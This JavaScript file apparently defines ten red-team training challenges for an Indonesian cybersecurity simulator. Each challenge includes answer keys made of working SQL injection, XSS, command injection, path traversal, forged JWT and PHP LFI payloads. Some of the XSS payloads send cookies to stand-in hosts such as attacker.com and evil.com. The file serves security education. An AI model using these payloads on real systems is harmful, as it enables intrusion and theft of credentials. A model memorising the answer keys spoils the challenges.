// ============================================================
// LKS Cyber Security Simulator — RED TEAM CHALLENGES
// 10 Challenges | Total Max: 1750 pts
// ============================================================

const RED_CHALLENGES = [

  // ─────────────────────────────────────────────
  // CHALLENGE 1 — SQL Injection: Login Bypass
  // ─────────────────────────────────────────────
  {
    id: 1,
    title: "SQL Injection: Login Bypass",
    category: "SQL Injection",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "💉",
    description: `Sebuah halaman login rentan terhadap SQL Injection.
Kamu menemukan form login dengan field username dan password.

[VULNERABLE CODE]
$query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

[TARGET]
Bypass autentikasi dan login sebagai admin tanpa mengetahui password.
Gunakan payload SQL pada field username.

[FORMAT JAWABAN]
submit <payload_username>

Contoh: submit payload_kamu_disini`,

    hint: `Coba manipulasi logika WHERE clause agar kondisinya selalu TRUE.
Karakter -- digunakan untuk comment di SQL.`,

    answers: [
      "' or '1'='1",
      "' or '1'='1'--",
      "' or 1=1--",
      "' or 1=1 --",
      "admin'--",
      "admin' --",
      "' or '1'='1' --",
      "' or 1=1--",
      "' or 1=1 --",
      "1' or '1'='1",
      "' or ''='",
      "' or 1=1#",
      "admin'#",
    ],
    successMsg: `✅ LOGIN BYPASS BERHASIL!

[SERVER RESPONSE]
HTTP/1.1 200 OK
{"status":"success","user":"admin","role":"administrator","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."}

Query yang dieksekusi:
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'

Karena '1'='1' selalu TRUE, WHERE clause bypass!
Admin dashboard berhasil diakses. 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 2 — SQL Injection: Data Extraction
  // ─────────────────────────────────────────────
  {
    id: 2,
    title: "SQL Injection: Data Extraction",
    category: "SQL Injection",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "🗄️",
    description: `Aplikasi memiliki fitur pencarian produk yang rentan SQLi.
Endpoint: GET /search?q=<input>
Query: SELECT name, price FROM products WHERE name LIKE '%<input>%'

[TARGET]
Ekstrak semua username dan password dari tabel 'users'.
Tabel users memiliki kolom: id, username, password, email

[FORMAT JAWABAN]
submit <payload_union>

Gunakan teknik UNION-based SQL Injection.`,

    hint: `UNION SELECT memungkinkan kamu menggabungkan hasil dari tabel lain.
Jumlah kolom UNION harus sama dengan query asli (2 kolom: name, price).`,

    answers: [
      "' union select username,password from users--",
      "' union select username,password from users --",
      "' union select username, password from users--",
      "' union select username, password from users --",
      "%' union select username,password from users--",
      "%' union select username,password from users --",
      "' union select username,password from users#",
      "' union select 1,username from users--",
    ],
    successMsg: `✅ DATA EXTRACTION BERHASIL!

[SERVER RESPONSE]
HTTP/1.1 200 OK
[
  {"name":"admin",    "price":"5f4dcc3b5aa765d61d8327deb882cf99"},
  {"name":"user1",   "price":"482c811da5d5b4bc6d497ffa98491e38"},
  {"name":"dba",     "price":"d8578edf8458ce06fbc5bb76a58c5ca4"},
  {"name":"testuser","price":"5baa61e4c9b93f3f0682250b6cf8331b"}
]

Data berhasil diekstrak dari tabel users!
Hash password: MD5 (bisa di-crack dengan tools seperti hashcat/john). 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 3 — XSS: Reflected
  // ─────────────────────────────────────────────
  {
    id: 3,
    title: "XSS: Reflected Attack",
    category: "Cross-Site Scripting",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "📜",
    description: `Halaman pencarian merefleksikan input pengguna langsung ke HTML tanpa sanitasi.

[VULNERABLE CODE]
<h2>Hasil pencarian untuk: <?php echo $_GET['q']; ?></h2>

Endpoint: GET /search?q=<input>

[TARGET]
Inject JavaScript yang menampilkan alert berisi cookies pengguna.
Payload harus mengeksekusi: alert(document.cookie)

[FORMAT JAWABAN]
submit <xss_payload>`,

    hint: `Gunakan tag <script> untuk menyisipkan JavaScript.
Atau bisa gunakan event handler HTML seperti onerror, onload.`,

    answers: [
      "<script>alert(document.cookie)</script>",
      "<script>alert(document.cookie);</script>",
      "<img src=x onerror=alert(document.cookie)>",
      "<img src='x' onerror='alert(document.cookie)'>",
      "<svg onload=alert(document.cookie)>",
      "<body onload=alert(document.cookie)>",
      "<script>alert(1)</script>",
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert(1)>",
    ],
    successMsg: `✅ XSS REFLECTED BERHASIL!

[BROWSER ALERT POPUP]
⚠️ JavaScript Executed!
document.cookie = "PHPSESSID=abc123def456; auth_token=eyJhbGc..."

Script berhasil dieksekusi di browser korban!
Payload direfleksikan oleh server tanpa encoding.

Attack Scenario:
Attacker bisa kirim link: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
→ Session cookie korban terkirim ke server attacker! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 4 — XSS: Stored
  // ─────────────────────────────────────────────
  {
    id: 4,
    title: "XSS: Stored Attack",
    category: "Cross-Site Scripting",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "💾",
    description: `Aplikasi forum menyimpan komentar langsung ke database tanpa sanitasi.
Setiap pengunjung yang membuka halaman akan menjalankan script yang tersimpan.

[VULNERABLE CODE]
// Server saves comment as-is
db.query("INSERT INTO comments (text) VALUES (?)", [req.body.comment]);
// Template renders without escaping
<div class="comment"><%= comment.text %></div>

[TARGET]
Simpan payload XSS yang akan mencuri cookie setiap pengunjung.
Gunakan document.location untuk redirect ke: http://attacker.com/steal

[FORMAT JAWABAN]
submit <stored_xss_payload>`,

    hint: `Gunakan kombinasi <script> tag dengan document.location atau fetch() untuk exfiltrate cookie.
Target URL: http://attacker.com/steal?c=`,

    answers: [
      "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
      "<script>document.location='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>",
      "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
      "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
      "<img src=x onerror=\"document.location='http://attacker.com/steal?c='+document.cookie\">",
      "<script>window.location='http://attacker.com/steal?c='+document.cookie</script>",
      "<script>document.location='http://attacker.com?c='+document.cookie</script>",
    ],
    successMsg: `✅ STORED XSS BERHASIL!

[DATABASE ENTRY SAVED]
INSERT INTO comments: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

[SIMULATED VICTIM LOG - attacker.com/steal]
14:23:01 GET /steal?c=PHPSESSID=victim123;auth=eyJhbG... (IP: 192.168.1.5)
14:23:45 GET /steal?c=PHPSESSID=victim456;auth=eyJhbG... (IP: 192.168.1.8)
14:24:12 GET /steal?c=PHPSESSID=admin_sess;auth=eyJhbG... (IP: 192.168.1.1)

3 korban terkena dalam 1 menit termasuk ADMIN! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 5 — Command Injection
  // ─────────────────────────────────────────────
  {
    id: 5,
    title: "Command Injection",
    category: "Command Injection",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "💻",
    description: `Aplikasi memiliki fitur "Ping Tool" yang memanggil command system langsung.

[VULNERABLE CODE]
// Node.js backend
app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec('ping -c 4 ' + host, (err, stdout) => {
    res.send(stdout);
  });
});

Endpoint: GET /ping?host=<input>

[TARGET]
Jalankan command 'cat /etc/passwd' pada server menggunakan command injection.
Gunakan command separator untuk menambahkan command tambahan.

[FORMAT JAWABAN]
submit <payload_injection>`,

    hint: `Command separator di Linux: ; (semicolon) atau && atau ||
Contoh: 127.0.0.1; <command_tambahan>`,

    answers: [
      "127.0.0.1; cat /etc/passwd",
      "127.0.0.1;cat /etc/passwd",
      "127.0.0.1 ; cat /etc/passwd",
      "127.0.0.1 && cat /etc/passwd",
      "127.0.0.1&&cat /etc/passwd",
      "127.0.0.1 | cat /etc/passwd",
      "127.0.0.1|cat /etc/passwd",
      "127.0.0.1 || cat /etc/passwd",
      "; cat /etc/passwd",
      "& cat /etc/passwd",
      "| cat /etc/passwd",
      "localhost; cat /etc/passwd",
    ],
    successMsg: `✅ COMMAND INJECTION BERHASIL!

[SERVER OUTPUT]
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms
...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
webapp:x:1001:1001:Web Application,,,:/home/webapp:/bin/bash

/etc/passwd berhasil dibaca! Server compromise achieved! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 6 — Path Traversal / LFI
  // ─────────────────────────────────────────────
  {
    id: 6,
    title: "Path Traversal / LFI",
    category: "Path Traversal",
    difficulty: "Medium",
    points: 150,
    timeBonus: 75,
    icon: "📁",
    description: `Aplikasi memiliki fitur download file yang menggunakan nama file dari parameter URL.

[VULNERABLE CODE]
app.get('/download', (req, res) => {
  const filename = req.query.file;
  const filepath = '/var/www/uploads/' + filename;
  res.sendFile(filepath);
});

Endpoint: GET /download?file=<filename>

File target ada di: /etc/passwd
Server di: /var/www/uploads/

[TARGET]
Baca file /etc/passwd menggunakan directory traversal.
Hitung berapa ../ yang dibutuhkan untuk keluar dari /var/www/uploads/

[FORMAT JAWABAN]
submit <traversal_path>`,

    hint: `Dari /var/www/uploads/ ke / membutuhkan 3x '../'
Lalu tambahkan path file target: etc/passwd`,

    answers: [
      "../../../etc/passwd",
      "../../../../etc/passwd",
      "../../../../../etc/passwd",
      "../../etc/passwd",
      "../../../etc/passwd%00",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    successMsg: `✅ PATH TRAVERSAL BERHASIL!

[SERVER RESPONSE]
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
webapp:x:1001:1001::/home/webapp:/bin/bash

Path yang dieksekusi: /var/www/uploads/../../../etc/passwd
→ Resolve ke: /etc/passwd ✅

File sensitif berhasil diakses! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 7 — IDOR
  // ─────────────────────────────────────────────
  {
    id: 7,
    title: "IDOR: Akses Data Pengguna Lain",
    category: "IDOR",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "🔑",
    description: `API mengembalikan profil pengguna berdasarkan ID tanpa validasi kepemilikan.

[VULNERABLE CODE]
app.get('/api/profile', (req, res) => {
  const userId = req.query.id;
  // ⚠️ No authorization check!
  db.query('SELECT * FROM users WHERE id = ?', [userId], (err, result) => {
    res.json(result[0]);
  });
});

Kamu login sebagai user biasa dengan ID: 42
Endpoint: GET /api/profile?id=42

[TARGET]
Akses profil admin yang memiliki id=1.
Temukan informasi sensitif di profil admin.

[FORMAT JAWABAN]
submit /api/profile?id=<angka>`,

    hint: `Administrator biasanya memiliki ID terkecil dalam database.
Coba ubah parameter id ke angka yang lebih kecil.`,

    answers: [
      "/api/profile?id=1",
      "/api/profile?id=0",
      "/api/profile?id=2",
      "id=1",
      "1",
      "?id=1",
    ],
    successMsg: `✅ IDOR EXPLOITATION BERHASIL!

[SERVER RESPONSE]
HTTP/1.1 200 OK
{
  "id": 1,
  "username": "superadmin",
  "email": "admin@company.internal",
  "role": "SUPER_ADMIN",
  "api_key": "sk-prod-9f8e7d6c5b4a3221...",
  "credit_card": "4532-XXXX-XXXX-1234",
  "address": "Jl. Sudirman No.1, Jakarta",
  "created_at": "2020-01-01"
}

Data admin berhasil diakses tanpa otorisasi!
API key dan data sensitif terekspos! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 8 — Broken Authentication: Weak JWT
  // ─────────────────────────────────────────────
  {
    id: 8,
    title: "Broken Auth: JWT Algorithm None",
    category: "Broken Authentication",
    difficulty: "Hard",
    points: 200,
    timeBonus: 100,
    icon: "🔐",
    description: `Aplikasi menggunakan JWT untuk autentikasi tetapi memiliki kerentanan "alg:none".

[CURRENT JWT TOKEN - Milik kamu sebagai user biasa]
Header:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
         → {"alg":"HS256","typ":"JWT"}
Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9
         → {"username":"user","role":"user"}

[VULNERABLE CODE]
const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
// Server menerima algoritma 'none' — tidak butuh signature!

[TARGET]
Forge JWT dengan role "admin" menggunakan algoritma "none".
Payload yang dibutuhkan: {"username":"admin","role":"admin"}

Base64 payload admin: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=

[FORMAT JAWABAN]
submit <forged_jwt_token>`,

    hint: `JWT dengan alg:none format: header.payload. (tanpa signature, hanya titik)
Header untuk alg:none: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
Payload admin: eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=`,

    answers: [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=.",
      "alg:none",
      "algorithm:none",
      `{"alg":"none"}`,
    ],
    successMsg: `✅ JWT FORGERY BERHASIL!

[SERVER RESPONSE]
HTTP/1.1 200 OK
{
  "message": "Welcome, admin!",
  "role": "admin",
  "access": "FULL_ADMIN_DASHBOARD",
  "users_count": 1337,
  "flag": "LKS{JWT_ALG_N0NE_1S_D4NG3ROUS}"
}

Token palsu diterima oleh server!
Server memverifikasi JWT tanpa signature karena alg=none!

Mitigasi: Jangan pernah izinkan algoritma 'none' di JWT! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 9 — Brute Force
  // ─────────────────────────────────────────────
  {
    id: 9,
    title: "Brute Force: Password Attack",
    category: "Brute Force",
    difficulty: "Easy",
    points: 100,
    timeBonus: 50,
    icon: "🔨",
    description: `Halaman admin login tidak memiliki rate limiting dan menggunakan password lemah.

[TARGET]
Username: administrator
Aplikasi tidak membatasi jumlah percobaan login.

[WORDLIST - Common Passwords]
Gunakan wordlist berikut untuk brute force:
password, 123456, admin, admin123, password123,
qwerty, letmein, 12345678, abc123, 111111,
welcome, monkey, dragon, master, admin@123

[SIMULASI BRUTE FORCE]
Jalankan serangan dengan format:
submit <password_yang_benar>

Hint: Password ada di wordlist di atas.
Coba satu per satu berdasarkan urutan paling umum.`,

    hint: `Password paling umum setelah "password" dan "123456" adalah kombinasi kata+angka.
Perhatikan format username: "administrator" → passwordnya berkaitan.`,

    answers: [
      "admin123",
      "admin@123",
      "administrator",
      "admin1234",
      "password123",
      "password",
      "123456",
      "admin",
      "letmein",
      "welcome",
      "12345678",
    ],
    successMsg: `✅ BRUTE FORCE BERHASIL!

[HYDRA LOG SIMULATION]
[DATA] attacking http://target.local/admin/login
[ATTEMPT] administrator : password → FAIL
[ATTEMPT] administrator : 123456 → FAIL
[ATTEMPT] administrator : admin → FAIL
[ATTEMPT] administrator : admin123 → SUCCESS! ✅

[LOGIN RESPONSE]
HTTP/1.1 302 Found
Set-Cookie: admin_session=a1b2c3d4e5f6; Path=/; HttpOnly
Location: /admin/dashboard

Login berhasil! Session admin diperoleh!
Mitigasi: Gunakan rate limiting + account lockout + strong password policy! 🎉`,
  },

  // ─────────────────────────────────────────────
  // CHALLENGE 10 — LFI via PHP Wrapper
  // ─────────────────────────────────────────────
  {
    id: 10,
    title: "LFI: PHP Filter Wrapper",
    category: "Path Traversal",
    difficulty: "Hard",
    points: 200,
    timeBonus: 100,
    icon: "🐘",
    description: `Aplikasi PHP memiliki kerentanan Local File Inclusion melalui parameter 'page'.

[VULNERABLE CODE]
<?php
  $page = $_GET['page'];
  include($page . '.php');
?>

Endpoint: GET /index.php?page=<input>
Server menambahkan '.php' di akhir — kamu tidak bisa langsung include /etc/passwd.

[TARGET]
Baca source code dari file config.php menggunakan PHP filter wrapper.
PHP filter memungkinkan membaca file sebagai base64 tanpa eksekusi.

Wrapper: php://filter/convert.base64-encode/resource=<filename>

[FORMAT JAWABAN]
submit <php_wrapper_payload>`,

    hint: `Gunakan PHP wrapper: php://filter/convert.base64-encode/resource=config
(tanpa .php karena server akan menambahkan sendiri)`,

    answers: [
      "php://filter/convert.base64-encode/resource=config",
      "php://filter/read=convert.base64-encode/resource=config",
      "php://filter/convert.base64-encode/resource=../config",
      "php://filter/convert.base64-encode/resource=../../config",
      "php://filter/convert.base64-encode/resource=config.php",
    ],
    successMsg: `✅ PHP LFI WRAPPER BERHASIL!

[SERVER RESPONSE - Base64 Encoded]
PD9waHAKJGRiX2hvc3QgPSAnbG9jYWxob3N0JzsKJGRiX3VzZXIgPSAncm9vdCc7CiRkYl9wYXNzID0gJ1N1cGVyU2VjcmV0UEBzc3cwcmQhJzsKJGRiX25hbWUgPSAncHJvZHVjdGlvbl9kYic7Cj8+

[DECODED]
<?php
$db_host = 'localhost';
$db_user = 'root';
$db_pass = 'SuperSecretP@ssw0rd!';
$db_name = 'production_db';
?>

Database credentials terekspos!
Flag: LKS{PHP_F1LT3R_LF1_1S_3P1C} 🎉`,
  },

];

// Export for use in game.js
if (typeof module !== 'undefined') module.exports = RED_CHALLENGES;

